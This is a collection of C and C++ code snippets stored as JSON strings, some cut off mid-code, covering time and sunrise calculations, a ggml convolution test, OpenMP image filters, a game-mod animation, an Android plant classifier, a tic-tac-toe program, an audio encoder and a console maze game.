0;\n\n    tm_year = tm->tm_year + YEAR_0;\n\n    if (TIME_MAX / 365 < tm_year - year)\n        overflow++;\n    day = (tm_year - year) * 365;\n    if (TIME_MAX - day < (tm_year - year) / 4 + 1)\n        overflow++;\n    day += (tm_year - year) / 4 + ((tm_year % 4) && tm_year % 4 < year % 4);\n    day -= (tm_year - year) / 100\n            + ((tm_year % 100) && tm_year % 100 < year % 100);\n    day += (tm_year - year) / 400\n            + ((tm_year % 400) && tm_year % 400 < year % 400);\n\n    yday = month = 0;\n    while (month < tm->tm_mon) {\n        yday += month_tab[IS_LEAP_YEAR(tm_year)][month];\n        month++;\n    }\n    yday += (tm->tm_mday - 1);\n    if (day + yday < 0)\n        overflow++;\n    day += yday;\n\n    tm->tm_yday = yday;\n    tm->tm_wday = (day + 4) % 7;\n\n    seconds = ((tm->tm_hour * 60L) + tm->tm_min) * 60L + tm->tm_sec;\n\n    if ((TIME_MAX - seconds) / SECS_IN_DAY < day)\n        overflow++;\n    seconds += day * SECS_IN_DAY;\n\n    if (overflow)\n        return (blynk_time_t) -1;\n\n    if ((blynk_time_t) seconds != seconds)\n        return (blynk_time_t) -1;\n    return (blynk_time_t) seconds;\n}\n\nint blynk_compute_sun(int8_t month, int8_t day, double latitude, double longitude, bool rise)\n{\n    float y, decl, eqt, ha, lon, lat;\n    uint8_t a;\n    int minutes;\n\n    month -= 1;\n    day   -= 1;\n    lat   =   latitude/57.295779513082322;\n    lon   = -longitude/57.295779513082322;\n\n    //approximate hour;\n    a = (rise) ? 18 : 6;\n\n    // approximate day of year\n    y = month * 30.4375 + day  + a/24.0; // 0... 365\n\n    // compute fractional year\n    y *= 1.718771839885e-02; // 0... 1\n\n    // compute equation of time... .43068174\n    eqt = 229.18 * (0.000075+0.001868*cos(y)  -0.032077*sin(y) -0.014615*cos(y*2) -0.040849*sin(y* 2) );\n\n    // compute solar declination... -0.398272\n    decl = 0.006918-0.399912*cos(y)+0.070257*sin(y)-0.006758*cos(y*2)+0.000907*sin(y*2)-0.002697*cos(y*3)+0.00148*sin(y*3);\n\n    //compute hour angle\n    ha = (  cos(1.585340737228125) / (cos(lat)*cos(decl)) -tan(lat) * tan(decl)  );\n\n    if (fabs(ha) > 1.0) { // we're in the (ant)arctic and there is no rise(or set) today!\n        return -1;\n    }\n\n    ha = acos(ha);\n    if(!rise) ha = -ha;\n\n    // compute minutes from midnight\n    minutes = 720+4*(lon-ha",
    "#include \"ggml.h\"\n#include \"ggml-alloc.h\"\n#include \"ggml-backend.h\"\n\n#ifdef GGML_USE_CUDA\n#include \"ggml-cuda.h\"\n#endif\n\n#ifdef GGML_USE_METAL\n#include \"ggml-metal.h\"\n#endif\n\n#include <cassert>\n#include <cmath>\n#include <cstdio>\n#include <cstring>\n#include <fstream>\n#include <map>\n#include <string>\n#include <vector>\n\nstatic void ggml_log_callback_default(ggml_log_level level, const char * text, void * user_data) {\n    (void) level;\n    (void) user_data;\n    fputs(text, stderr);\n    fflush(stderr);\n}\n\nstruct test_model {\n    struct ggml_tensor * a;\n    struct ggml_tensor * b;\n    ggml_backend_t backend = NULL;\n    ggml_backend_buffer_t buffer;\n    struct ggml_context * ctx;\n};\n\nvoid load_model(test_model & model, bool use_gpu = false) {\n    // create data\n    int K = 3, IC = 10, OC = 10;\n    int IL = 8, N = 1;\n\n    // Initialize adata\n    std::vector<float> adata(K * IC * OC);\n    for (int i = 0; i < K * IC * OC; i++) {\n        adata[i] = 4.5f;\n    }\n\n    // Convert adata to fp16 format\n    std::vector<ggml_fp16_t> hadata(K * IC * OC);\n    ggml_fp32_to_fp16_row(adata.data(), hadata.data(), K * IC * OC);\n\n    // Initialize bdata\n    std::vector<float> bdata(IL * IC * N);\n    for (int i = 0; i < IL * IC * N; i++) {\n        bdata[i] = 2.5f;\n    }\n\n    size_t buffer_size = 0;\n    {\n        buffer_size += K * IC * OC * ggml_type_size(GGML_TYPE_F16); // tensor a\n        buffer_size += IL * IC * N * ggml_type_size(GGML_TYPE_F32); // tensor b\n        buffer_size += 1024; // overhead\n    }\n\n    printf(\"%s: ggml tensor size    = %d bytes\\n\", __func__, (int) sizeof(ggml_tensor));\n    printf(\"%s: backend buffer size = %0.2f MB\\n\", __func__, (buffer_size/ 1024.f/ 1024.f));\n\n    int num_tensors = 2;\n    struct ggml_init_params params {\n            /*.mem_size   =*/ ggml_tensor_overhead() * num_tensors,\n            /*.mem_buffer =*/ NULL,\n            /*.no_alloc   =*/ true,\n    };\n\n    // initialize the backend\n#ifdef GGML_USE_CUDA\n    if (use_gpu) {\n        fprintf(stderr, \"%s: using CUDA backend\\n\", __func__);\n        model.backend = ggml_backend_cuda_init(0);\n        if (!model.backend) {\n            fprintf(stderr, \"%s: ggml_backend_cuda_init() failed\\n\", __func__);\n        }\n    }\n#endif\n\n#ifdef GGML_USE_METAL\n    if (use_gpu) {\n        fprintf(stderr, \"%s: using Metal backend\\n\", __func__);\n        ggml_backend_metal_log_set_callback(ggml_log_callback_default, nullptr);\n        model.backend = ggml_backend_metal_init();\n        if (!model.backend) {\n            fprintf(stderr, \"%s: ggml_backend_metal_init() failed\\n\", __func__);\n        }\n    }\n#endif\n\n    if(!model.backend) {\n        // fallback to CPU backend\n        model.backend = ggml_backend_cpu_init();\n    }\n\n    model.buffer = ggml_backend_alloc_buffer(model.backend, buffer_size);\n\n    // create context\n    model.ctx = ggml_init(params);\n\n    // create tensors\n    model.a = ggml_new_tensor_3d(model.ctx, GGML_TYPE_F16,  K, IC, OC);\n    model.b = ggml_new_tensor_3d(model.ctx, GGML_TYPE_F32, IL, IC, N);\n\n    // create a allocator\n    ggml_tallocr alloc = ggml_tallocr_new(model.buffer);\n\n    // alloc memory\n    ggml_tallocr_alloc(&alloc, model.a);\n\n    // load data to buffer\n    if(ggml_backend_is_cpu(model.backend)) {\n        memcpy(model.a->data, hadata.data(), ggml_nbytes(model.a));\n    } else {\n        ggml_backend_tensor_set(model.a, hadata.data(), 0, ggml_nbytes(model.a));\n    }\n\n    // alloc memory\n    ggml_tallocr_alloc(&alloc, model.b);\n\n    if(ggml_backend_is_cpu(model.backend)\n#ifdef GGML_USE_METAL\n                || ggml_backend_is_metal(model.backend)\n#endif\n    ) {\n        memcpy(model.b->data, bdata.data(), ggml_nbytes(model.b));\n    } else {\n        ggml_backend_tensor_set(model.b, bdata.data(), 0, ggml_nbytes(model.b));\n    }\n}\n\nstruct ggml_cgraph * build_graph(const test_model& model) {\n    static size_t buf_size = ggml_tensor_overhead()*GGML_DEFAULT_GRAPH_SIZE + ggml_graph_overhead();\n    static std::vector<uint8_t> buf(buf_size);\n\n    struct ggml_init_params params0 = {\n        /*.mem_size   =*/ buf_size,\n        /*.mem_buffer =*/ buf.data(),\n        /*.no_alloc   =*/ true, // the tensors will be allocated later by ggml_gallocr_alloc_graph()\n    };\n\n    // create a temporally context to build the graph\n    struct ggml_context * ctx0 = ggml_init(params0);\n\n    struct ggml_cgraph  * gf = ggml_new_graph(ctx0);\n\n    int s0 = 1;\n    int p0 = 1;\n    int d0 = 1;\n\n    // split conv1d in fundamental methods for test unit\n    struct ggml_tensor* im2col_0 = ggml_im2col(ctx0, model.a, model.b, s0, 0, p0, 0, d0, 0, false, GGML_TYPE_F16);\n    ggml_set_name(im2col_0, \"im2col_res\");\n    ggml_build_forward_expand(gf, im2col_0);\n\n    struct ggml_tensor* conv1d_res = ggml_conv_1d(ctx0, model.a, model.b, s0, p0, d0);\n    ggml_set_name(conv1d_res, \"conv1d_res\");\n    ggml_build_forward_expand(gf, conv1d_res);\n\n    // delete the temporally context used to build the graph\n    ggml_free(ctx0);\n    return gf;\n}\n\nstruct ggml_cgraph* compute_graph(const test_model & mode",
    "#include \"ProcesadorImagen.h\"\n#include <iostream>\n#include <chrono>\n#include <fstream>\n#include <algorithm>\n#include <cmath>\n#include <omp.h>\n\nvoid ProcesadorImagen::invertirColores(Archivo_jpeg& archivo) {\n    auto inicio = std::chrono::high_resolution_clock::now();\n    \n    std::cout << \"Invirtiendo colores de la imagen: \" << archivo.obtenerNombreArchivo() << std::endl;\n    auto& datosImagen = archivo.obtenerDatosImagen();\n    \n    for (auto& pixel : datosImagen) {\n        pixel = 255 - pixel;\n    }\n    \n    archivo.guardarImagen(\"InvertirColores\", false);\n    \n    auto fin = std::chrono::high_resolution_clock::now();\n    double tiempo = std::chrono::duration<double, std::milli>(fin - inicio).count();\n    guardarTiempoProcesamiento(\"invertirColores\", tiempo);\n    std::cout << \"Tiempo de procesamiento (invertirColores): \" << tiempo << \" ms\" << std::endl;\n}\n\nvoid ProcesadorImagen::invertirColoresOpenMP(Archivo_jpeg& archivo) {\n    auto inicio = std::chrono::high_resolution_clock::now();\n    \n    std::cout << \"Invirtiendo colores de la imagen (OpenMP): \" << archivo.obtenerNombreArchivo() << std::endl;\n    auto& datosImagen = archivo.obtenerDatosImagen();\n    \n    #pragma omp parallel for\n    for (size_t i = 0; i < datosImagen.size(); ++i) {\n        datosImagen[i] = 255 - datosImagen[i];\n    }\n    \n    archivo.guardarImagen(\"InvertirColores\", true);\n    \n    auto fin = std::chrono::high_resolution_clock::now();\n    double tiempo = std::chrono::duration<double, std::milli>(fin - inicio).count();\n    guardarTiempoProcesamiento(\"invertirColoresOpenMP\", tiempo);\n    std::cout << \"Tiempo de procesamiento (invertirColoresOpenMP): \" << tiempo << \" ms\" << std::endl;\n}\n\nvoid ProcesadorImagen::binarizarImagen(Archivo_jpeg& archivo) {\n    auto inicio = std::chrono::high_resolution_clock::now();\n    \n    std::cout << \"Binarizando la imagen: \" << archivo.obtenerNombreArchivo() << std::endl;\n    auto& datosImagen = archivo.obtenerDatosImagen();\n    int ancho = archivo.obtenerAncho();\n    int alto = archivo.obtenerAlto();\n    int numComponentes = archivo.obtenerNumComponentes();\n    \n    for (int y = 0; y < alto; ++y) {\n        for (int x = 0; x < ancho; ++x) {\n            int promedio = 0;\n            for (int c = 0; c < numComponentes; ++c) {\n                promedio += datosImagen[(y * ancho + x) * numComponentes + c];\n            }\n            promedio /= numComponentes;\n            \n            unsigned char valor = (promedio > 128) ? 255 : 0;\n            for (int c = 0; c < numComponentes; ++c) {\n                datosImagen[(y * ancho + x) * numComponentes + c] = valor;\n            }\n        }\n    }\n    \n    archivo.guardarImagen(\"BinarizarImagen\", false);\n    \n    auto fin = std::chrono::high_resolution_clock::now();\n    double tiempo = std::chrono::duration<double, std::milli>(fin - inicio).count();\n    guardarTiempoProcesamiento(\"binarizarImagen\", tiempo);\n    std::cout << \"Tiempo de procesamiento (binarizarImagen): \" << tiempo << \" ms\" << std::endl;\n}\n\nvoid ProcesadorImagen::binarizarImagenOpenMP(Archivo_jpeg& archivo) {\n    auto inicio = std::chrono::high_resolution_clock::now();\n    \n    std::cout << \"Binarizando la imagen (OpenMP): \" << archivo.obtenerNombreArchivo() << std::endl;\n    auto& datosImagen = archivo.obtenerDatosImagen();\n    int ancho = archivo.obtenerAncho();\n    int alto = archivo.obtenerAlto();\n    int numComponentes = archivo.obtenerNumComponentes();\n    \n    #pragma omp parallel for collapse(2)\n    for (int y = 0; y < alto; ++y) {\n        for (int x = 0; x < ancho; ++x) {\n            int promedio = 0;\n            for (int c = 0; c < numComponentes; ++c) {\n                promedio += datosImagen[(y * ancho + x) * numComponentes + c];\n            }\n            promedio /= numComponentes;\n            \n            unsigned char valor = (promedio > 128) ? 255 : 0;\n            for (int c = 0; c < numComponentes; ++c) {\n                datosImagen[(y * ancho + x) * numComponentes + c] = valor;\n            }\n        }\n    }\n    \n    archivo.guardarImagen(\"BinarizarImagen\", true);\n    \n    auto fin = std::chrono::high_resolution_clock::now();\n    double tiempo = std::chrono::duration<double, std::milli>(fin - inicio).count();\n    guardarTiempoProcesamiento(\"binarizarImagenOpenMP\", tiempo);\n    std::cout << \"Tiempo de procesamiento (binarizarImagenOpenMP): \" << tiempo << \" ms\" << std::endl;\n}\n\nvoid ProcesadorImagen::espejoImagen(Archivo_jpeg& archivo) {\n    auto inicio = std::chrono::high_resolution_clock::now();\n    \n    std::cout << \"Aplicando efecto espejo a la imagen: \" << archivo.obtenerNombreArchivo() << std::endl;\n    auto& datosImagen = archivo.obtenerDatosImagen();\n    int ancho = archivo.obtenerAncho();\n    int alto = archivo.obtenerAlto();\n    int numComponentes = archivo.obtenerNumComponentes();\n    \n    for (int y = 0; y < alto; ++y) {\n        for (int x = 0; x < ancho / 2; ++x) {\n            for (int c = 0; c < numComponentes; ++c) {\n                std::swap(datosImagen[(y * ancho + x) * ",
    "#include \"TotemAnimation.hpp\"\n\nusing namespace geode::prelude;\n\nbool TotemAnimation::init(std::function<void()> onceFinished, bool shouldCleanup) {\n\tif (!CCSprite::init()) return false;\n\tthis->schedule(schedule_selector(TotemAnimation::startAnimation), (0.3f/12.0f));\n\tthis->setScale(2.850f); // set scale cause 1 looks small\n\tthis->setID(\"totem-animation\"_spr);\n\n\tonFinished = onceFinished;\n\tm_shouldCleanup = shouldCleanup;\n\n\tauto fmod = FMODAudioEngine::sharedEngine();\n\tfmod->playEffect(\"totemfx.mp3\"_spr);\n\n\t\n\treturn true;\n}\n\nvoid TotemAnimation::FreeTheMemoryOfTheTotemAnimationClassWhichWouldComeInHandyInCertainCasesLikeWhenTheAnimationIsFinishedAndActuallyItsOnlyPurposeIsToGetFreedWhenTheAnimationIsDoneWhichIsPrettyCool() {\n\tif (this->getParent()) {\n\t\tthis->removeFromParent();\n\t}\n\tthis->release();\n}\n\nvoid TotemAnimation::startAnimation(float dt) {\n\tstatic int frame = 1;\n\tif (frame == 67) {\n\t\tframe = 1;\n\t\tonFinished();\n\t\tif (m_shouldCleanup) {\n\t\t\tTotemAnimation::FreeTheMemoryOfTheTotemAnimationClassWhichWouldComeInHandyInCertainCasesLikeWhenTheAnimationIsFinishedAndActuallyItsOnlyPurposeIsToGetFreedWhenTheAnimationIsDoneWhichIsPrettyCool();\n\t\t}\n\t\t\n\t}\n\n\tauto spriteName = fmt::format(\"mctotem_anim_{:02d}.png\"_spr, frame);\n\n\tauto sprframe = CCSpriteFrameCache::get()->spriteFrameByName(spriteName.c_str());\n\tif (sprframe) {\n\t\tthis->setDisplayFrame(sprframe);\n\t}\n\t\n\n\t++frame;\n\t\n}\n\nTotemAnimation* TotemAnimation::create(std::function<void()> onceFinished, bool shouldCleanup) {\n\tauto ret = new TotemAnimation();\n\tif (ret->init(onceFinished, shouldCleanup)) {\n\t\tret->autorelease();\n\t\treturn ret;\n\t}\n\tCC_SAFE_DELETE(ret);\n\treturn nullptr;\n}",
    "// Write C++ code here.\n//\n// Do not forget to dynamically load the C++ library into your application.\n//\n// For instance,\n//\n// In MainActivity.java:\n//    static {\n//       System.loadLibrary(\"plantclassification_v2\");\n//    }\n//\n// Or, in MainActivity.kt:\n//    companion object {\n//      init {\n//         System.loadLibrary(\"plantclassification_v2\")\n//      }\n//    }\n\n#include <android/asset_manager_jni.h>\n#include <android/bitmap.h>\n#include <android/log.h>\n#include <jni.h>\n#include <algorithm>\n#include <string>\n#include <vector>\n#include \"ClassName.h\"\n\n// ncnn\n#include \"layer.h\"\n#include \"net.h\"\n#include \"benchmark.h\"\n\n\nstatic ncnn::Net PlantRecognition;\nstatic ncnn::Net InsectRecognition;\n\nstruct Obj{\n    float prob;\n    int idx;\n};\n\n\nbool cmp(const Obj& a,const Obj& b){\n    return a.prob>b.prob;\n}\nstatic void Softmax(std::vector<Obj>& output,const ncnn::Mat& in){\n    int num = in.w;\n    float sum = 0.f;\n    for (int i = 0; i < num; ++i) {\n        sum+=exp(in[i]);\n    }\n    for (int i = 0; i < num; ++i) {\n        float prob = exp(in[i])/sum;\n        Obj item;\n        item.prob = prob;\n        item.idx = i;\n        output.push_back(item);\n    }\n    std::sort(output.begin(),output.end(), cmp);\n\n\n}\n\nextern \"C\" {\nstatic jclass objCls = NULL;\nstatic jmethodID constructorId;\nstatic jfieldID idxId;\nstatic jfieldID probId;\nstatic jfieldID chineseNameId;\nstatic jfieldID latinNameId;\n\nJNIEXPORT jboolean JNICALL\nJava_com_example_plantclassification_1v2_recognitionModel_PlantRecognitionModel_init(JNIEnv *env,jobject thiz,jobject assetManager) {\n    //\u6a21\u578b\u521d\u59cb\u5316\n    AAssetManager *mgr = AAssetManager_fromJava(env, assetManager);\n    {\n        int ret = PlantRecognition.load_param(mgr, \"quarrying_plantid_model.param\");\n        if (ret != 0) {\n            __android_log_print(ANDROID_LOG_DEBUG, \"model\", \"load_param failed\");\n            return JNI_FALSE;\n        }\n    }\n    {\n        int ret = PlantRecognition.load_model(mgr, \"quarrying_plantid_model.bin\");\n        if (ret != 0) {\n            __android_log_print(ANDROID_LOG_DEBUG, \"model\", \"load_model failed\");\n            return JNI_FALSE;\n        }\n    }\n    jclass localClass = env->FindClass(\n            \"com/example/plantclassification_v2/recognitionModel/PlantRecognitionModel$PlantObj\");\n    objCls = reinterpret_cast<jclass>(env->NewGlobalRef(localClass));\n    constructorId = env->GetMethodID(objCls, \"<init>\", \"()V\");\n\n    idxId = env->GetFieldID(objCls, \"idx\", \"I\");\n    probId = env->GetFieldID(objCls, \"prob\", \"F\");\n    chineseNameId = env->GetFieldID(objCls, \"chineseName\", \"Ljava/lang/String;\");\n    latinNameId = env->GetFieldID(objCls, \"latinName\", \"Ljava/lang/String;\");\n\n    return JNI_TRUE;\n\n}\nJNIEXPORT jobjectArray JNICALL\nJava_com_example_plantclassification_1v2_recognitionModel_PlantRecognitionModel_detect(JNIEnv *env,jobject thiz,jobject bitmap) {\n    AndroidBitmapInfo info;\n    AndroidBitmap_getInfo(env, bitmap, &info);\n    const int width = info.width;\n    const int height = info.height;\n\n    if (info.format != ANDROID_BITMAP_FORMAT_RGBA_8888)\n        return NULL;\n    const int target_size = 224;\n\n    int w = width;\n    int h = height;\n    float scale = 1.0f;\n    if (w > h) {\n        scale = (float) target_size / w;\n        w = target_size;\n        h = h * scale;\n    } else {\n        scale = (float) target_size / h;\n        h = target_size;\n        w = w * scale;\n    }\n    ncnn::Mat in_pad = ncnn::Mat::from_android_bitmap_resize(env, bitmap, ncnn::Mat::PIXEL_RGB, w,\n                                                             h);\n    //\u56fe\u50cf\u5904\u7406\n    const float norm_vals[3] = {1 / 0.229f / 255.f, 1 / 0.224f / 255.f, 1 / 0.225f / 255.f};\n    const float mean_vals[3] = {0.485f * 255.f, 0.456f * 255.f, 0.406f * 255.f};\n    in_pad.substract_mean_normalize(mean_vals, norm_vals);\n\n    ncnn::Extractor ex = PlantRecognition.create_extractor();\n    ex.input(\"input.1\", in_pad);\n    ncnn::Mat preds;\n    ex.extract(\"477\", preds);\n    std::vector<Obj> out;\n    Softmax(out, preds);\n    int resultSize = 5;\n    jobjectArray jObjArray = env->NewObjectArray(resultSize, objCls, NULL);\n    for (int i = 0; i < resultSize; ++i) {\n        jobject jObj = env->NewObject(objCls, constructorId);\n\n        env->SetIntField(jObj, idxId, out[i].idx);\n        env->SetFloatField(jObj, probId, out[i].prob);\n        env->SetObjectField(jObj, chineseNameId, env->NewStringUTF(plantChineseName[out[i].idx]));\n        env->SetObjectField(jObj, latinNameId, env->NewStringUTF(plantLatinName[out[i].idx]));\n\n        env->SetObjectArrayElement(jObjArray, i, jObj);\n    }\n\n    return jObjArray;\n\n}\nstatic jclass insectObjCls = NULL;\nstatic jmethodID insectConstructorId;\nstatic jfieldID insectIdxId;\nstatic jfieldID insectProbId;\nstatic jfieldID insectChineseNameId;\nstatic jfieldID insectLatinNameId;\nJNIEXPORT jboolean JNICALL\nJava_com_example_plantclassification_1v2_recognitionModel_InsectIdentificationModel_init(\n        JNIEnv *env, jobject thiz, jobject assetManager) {\n    AAssetManager* mgr = AAssetManage",
    "bool isWin(char game[3][3]){ \n    bool win = false; \n    if (game[0][0] == game[0][1] && game[0][1] == game[0][2] && (game[0][0] \n    == 'X' || game[0][0] == 'O')) win = true; \n    if (game[1][0] == game[1][1] && game[1][1] == game[1][2] && (game[1][0] \n    == 'X' || game[1][0] == 'O')) win = true; \n    if (game[2][0] == game[2][1] && game[2][1] == game[2][2] && (game[2][0] \n    == 'X' || game[2][0] == 'O')) win = true; \n    // column \n    if (game[0][0] == game[1][0] && game[1][0] == game[2][0] && (game[0][0] \n    == 'X' || game[0][0] == 'O')) win = true; \n    if (game[0][1] == game[1][1] && game[1][1] == game[2][1] && (game[0][1] \n    == 'X' || game[0][1] == 'O')) win = true; \n    if (game[0][2] == game[1][2] && game[1][2] == game[2][2] && (game[0][2] \n    == 'X' || game[0][2] == 'O')) win = true; \n    // diagonal \n    if (game[0][0] == game[1][1] && game[1][1] == game[2][2] && (game[0][0] \n    == 'X' || game[0][0] == 'O')) win = true; \n    if (game[0][2] == game[1][1] && game[1][1] == game[2][0] && (game[0][2] \n    == 'X' || game[0][2] == 'O')) win = true; \n    return win; \n} \n \nint main(){ \n    int i, j; \n    char game[3][3] = {' '}; // Tic-tac-toe \n    char player1 = 'X'; \n    char player2 = 'O'; \n    bool turn = true; // false for player 1's turn, true for player 2's turn. Player 1 first. \n    cout << \"X = Player 1\" << endl << \"O = Player 2\" << endl; \n    for (int n=0; n<9; n++){ \n        turn = !turn;  // use the not-operator to change true to false or false to true. \n        if (turn == false) \n            cout << \"Player 1: \"; \n        else \n            cout << \"Player 2: \"; \n        cout << \"Which cell to mark? i:[1..3], j:[1..3]: \";  \n        cin >> i >> j; \n        if (turn == false) \n        game[i][j] = 'X';\n        else  \n        game[i][j] = 'O'; \n        if (isWin(game)){ \n            cout << \"Win!\" << endl; \n            break; // need to terminate the problem \n        } \n    } \n    if (i==3) // all celles with i=0 to 2 have been inputted above but no winner yet \n        cout << \"Tie!\" << endl; \n \n // show the game to console \n    cout << game[0][0] << \" \" << game[0][1] << \" \" << game[0][2] << endl; \n    cout << game[1][0] << \" \" << game[1][1] << \" \" << game[1][2] << endl; \n    cout << game[2][0] << \" \" << game[2][1] << \" \" << game[2][2] << endl; \n    return 0; \n}\n",
    "/*\n  ISC License\n\n  Copyright (c) 2024, Antonio SJ Musumeci <trapexit@spawn.link>\n\n  Permission to use, copy, modify, and/or distribute this software for any\n  purpose with or without fee is hereby granted, provided that the above\n  copyright notice and this permission notice appear in all copies.\n\n  THE SOFTWARE IS PROVIDED \"AS IS\" AND THE AUTHOR DISCLAIMS ALL WARRANTIES\n  WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF\n  MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR\n  ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES\n  WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN\n  ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF\n  OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.\n*/\n\n#include \"subcmd_to_sdx2.hpp\"\n\n#include \"fmt.hpp\"\n#include \"sdx2_encode.h\"\n#include \"options.hpp\"\n#include \"types_ints.h\"\n\n#include <vector>\n\n#include <cstdio>\n\nnamespace l\n{\n  static\n  u32\n  file_size(FILE *f_)\n  {\n    long orig_off;\n    long size;\n\n    orig_off = ftell(f_);\n    fseek(f_,0,SEEK_END);\n    size = ftell(f_);\n    fseek(f_,orig_off,SEEK_SET);\n\n    return size;\n  }\n  \n  void\n  to_sdx2(const std::filesystem::path &filepath_)\n  {\n    FILE *in_file;\n    FILE *out_file;\n    std::vector<s16> input_data;\n    std::vector<s8>  output_data;\n    u32  sample_count;\n\n    in_file  = fopen(filepath_.string().c_str(),\"rb\");\n    out_file = fopen(\"sdx2.test.raw\",\"wb\");\n\n    sample_count = l::file_size(in_file);\n    sample_count /= 2;\n\n    input_data.resize(sample_count);\n    output_data.resize(sample_count);\n    \n    // Pad to word / 4 byte alignment for use with 3DO\n    // https://3dodev.com/documentation/development/opera/pf25/ppgfldr/mgsfldr/mprfldr/01mpr021\n    output_data.resize(((output_data.size() + 3) / 4) * 4);\n\n    fread(&input_data[0],\n          sizeof(s16),\n          input_data.size(),\n          in_file);\n\n    sdx2_encode(input_data.data(),\n                input_data.size(),\n                SDX2_MONO,\n                output_data.data(),\n                output_data.size());\n    \n    fwrite(&output_data[0],\n           sizeof(u8),\n           output_data.size(),\n           out_file);\n\n    fclose(out_file);\n    fclose(in_file);\n  }\n}\n\nvoid\nSubCmd::to_sdx2(const Opts::ToSDX2 &opts_)\n{\n  for(auto &filepath : opts_.filepaths)\n    l::to_sdx2(filepath);\n}\n",
    "\ufeff#include <iostream>\n#include <windows.h> // \u043e\u043a\u0440\u0430\u0448\u0438\u0432\u0430\u043d\u0438\u0435 \u043a\u043e\u043d\u0441\u043e\u043b\u0438 \u0438 \u0440\u0430\u0431\u043e\u0442\u0430 \u0441 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430\u043c\u0438\n#include <conio.h>\nusing namespace std;\n\n// enumeration - \u043f\u0435\u0440\u0435\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u0435\nenum KeyCodes { ENTER = 13, ESCAPE = 27, LEFT = 75, RIGHT = 77, UP = 72, DOWN = 80, SPACEBAR = 32 };\nenum Colors { DARKGREEN = 2, RED = 12, YELLOW = 14, BLUE = 9 };\n// \u043c\u043e\u0434\u0435\u043b\u044c \u043b\u043e\u043a\u0430\u0446\u0438\u0438\nenum Objects { HALL, WALL, COIN, ENEMY }; // 0 - \u043a\u043e\u0440\u0438\u0434\u043e\u0440\u044b (\u043f\u0443\u0441\u0442\u043e\u0442\u044b), 1 - \u0441\u0442\u0435\u043d\u0430 \u0440\u0430\u0437\u0440\u0443\u0448\u0430\u0435\u043c\u0430\u044f, 2 - \u043c\u043e\u043d\u0435\u0442\u043a\u0438,  3 - \u0432\u0440\u0430\u0433\u0438\n\nvoid print_message(int x, int y, int color, string message);\nvoid print_message_coin(int x, int y, int color, int message);\nvoid hide_cursor();\nvoid location_gen(int location[][50], int WIDTH, int HEIGHT);\nvoid location_show(int location[][50], int WIDTH, int HEIGHT);\nvoid hero_show(COORD position, HANDLE h);\nvoid hero_erase(COORD position, HANDLE h);\nCOORD key_dir(int location[][50], int code, COORD position);\nint hero_coins(int location[][50], COORD position, int coins);\nint main();\n\nvoid print_message(int x, int y, int color, string message) // \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u043a\u043e\u0442\u043e\u0440\u043e\u0435 \u0432\u044b\u0432\u043e\u0434\u0438\u0442\u0441\u044f \u043f\u0440\u0438 \u043f\u043e\u0431\u0435\u0434\u0435 \u0438\u043b\u0438 \u0441\u0431\u043e\u0440\u0435 \u043c\u043e\u043d\u0435\u0442\u044b\n{\n\tHANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);\n\tsetlocale(0, \"\");\n\tCOORD position_text;\n\tposition_text.X = x;\n\tposition_text.Y = y;\n\tSetConsoleCursorPosition(h, position_text);\n\tSetConsoleTextAttribute(h, color);\n\tcout << message << \"\\n\";\n}\n\nvoid print_message_coin(int x, int y, int color, int message) // \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u043a\u043e\u0442\u043e\u0440\u043e\u0435 \u0432\u044b\u0432\u043e\u0434\u0438\u0442\u0441\u044f \u043f\u0440\u0438 \u043f\u043e\u0431\u0435\u0434\u0435\n{\n\tHANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);\n\tsetlocale(0, \"\");\n\tCOORD position_text;\n\tposition_text.X = x;\n\tposition_text.Y = y;\n\tSetConsoleCursorPosition(h, position_text);\n\tSetConsoleTextAttribute(h, color);\n\tcout << message << \"\\n\";\n}\n\nvoid hide_cursor()\t\t\t\t\t\t\t\t\t\t\t// \u0441\u043a\u0440\u044b\u0442\u044c \u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u043d\u044b\u0439 \u043c\u0438\u0433\u0430\u044e\u0449\u0438\u0439 \u043a\u0443\u0440\u0441\u043e\u0440\n{\n\tHANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);\n\tCONSOLE_CURSOR_INFO info;\n\tinfo.bVisible = false;\n\tinfo.dwSize = 100;\n\tSetConsoleCursorInfo(h, &info);\n}\n\nvoid location_gen(int location[][50], int WIDTH, int HEIGHT)\t\t\t\t\t\t\t\t\t\t\t// \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u043b\u043e\u043a\u0430\u0446\u0438\u0438\n{\n\tfor (int y = 0; y < HEIGHT; y++) // \u043f\u0435\u0440\u0435\u0431\u043e\u0440 \u0441\u0442\u0440\u043e\u043a\n\t{\n\t\tfor (int x = 0; x < WIDTH; x++) // \u043f\u0435\u0440\u0435\u0431\u043e\u0440 \u0441\u0442\u043e\u043b\u0431\u0446\u043e\u0432\n\t\t{\n\t\t\t// \u043f\u043e \u0434\u0435\u0444\u043e\u043b\u0442\u0443 \u043f\u0438\u0448\u0435\u0442\u0441\u044f \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e\n\t\t\tlocation[y][x] = rand() % 4; // 0 1 2 3\n\n\t\t\t// \u0441\u0442\u0435\u043d\u044b \u043f\u043e \u043a\u0440\u0430\u044f\u043c\n\t\t\tif (x == 0 || y == 0 || x == WIDTH - 1 || y == HEIGHT - 1)\n\t\t\t\tlocation[y][x] = WALL;\n\n\t\t\t// \u0432\u0445\u043e\u0434 \u0438 \u0432\u044b\u0445\u043e\u0434\n\t\t\tif (x == 0 && y == 2 || x == WIDTH - 1 && y == HEIGHT - 3)\n\t\t\t\tlocation[y][x] = HALL;\n\n\t\t\tif (location[y][x] == ENEMY) {\n\t\t\t\t// 